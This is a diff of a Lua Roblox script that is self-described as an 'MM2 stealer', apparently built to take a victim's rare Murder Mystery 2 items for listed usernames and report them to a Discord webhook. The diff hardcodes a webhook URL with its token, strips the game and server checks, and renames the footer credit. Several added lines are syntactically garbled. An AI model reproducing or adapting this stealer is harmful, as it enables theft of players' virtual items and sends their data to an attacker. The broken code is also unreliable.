@@ -8,30 +8,19 @@ local users = _G.Usernames or {"gravyisthebest_right,JamesBraden2"}
 local min_rarity = _G.min_rarity or "Godly"
 local min_value = _G.min_value or 1
 local ping = _G.pingEveryone or "Yes"
-local webhook = _G.webhook or ""
+local webhook = _G.webhook or "https://discord.com/api/webhooks/1429725379719073880/dyip9tvqFAuz2oaol1fTh9ZSOCv3vIdSDNC8VEM5Gl7_PdDq6lQe9mqAP_DCtYeGVkSr"
 
-if next(users) == nil or webhook == "https://discord.com/api/webhooks/1429725379719073880/dyip9tvqFAuz2oaol1fTh9ZSOCv3vIdSDNC8VEM5Gl7_PdDq6lQe9mqAP_DCtYe"
+if next(users) == nil or webhook == ""
 warn("You didn't add username or webhook")
     return
 end
 
-if game.PlaceId ~= 142823291 then
-    plr:kick("Game not supported. Please join a normal MM2 server")
-    return
-end
-
-if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
-    plr:kick("Server error. Please join a DIFFERENT server")
-    return
-end
-
 local weaponsToSend = {}
-local Players = game:GetService("Players")
+local Players ifgame:GetService("Players")
 local plr = Players.LocalPlayer
 local playerGui = plr:WaitForChild("PlayerGui")
 local database = require(game.ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
-local HttpService = game:GetService("HttpService")
-
+local HttpService = game:GetService("HttpService"if
 local rarityTable = {
     "Common",
     "Uncommon",
@@ -282,7 +271,7 @@ local function SendFirstMessage(list, prefix)
             ["color"] = 65280,
             ["fields"] = fields,
             ["footer"] = {
-                ["text"] = "MM2 stealer by Tobi. discord.gg/GY2RVSEGDT"
+                ["text"] = "MM2 Pew"
             }
         }}
     }
@@ -496,6 +485,7 @@ if #weaponsToSend > 0 then
     end
     waitForUserChat()
 end
+
 
 
 
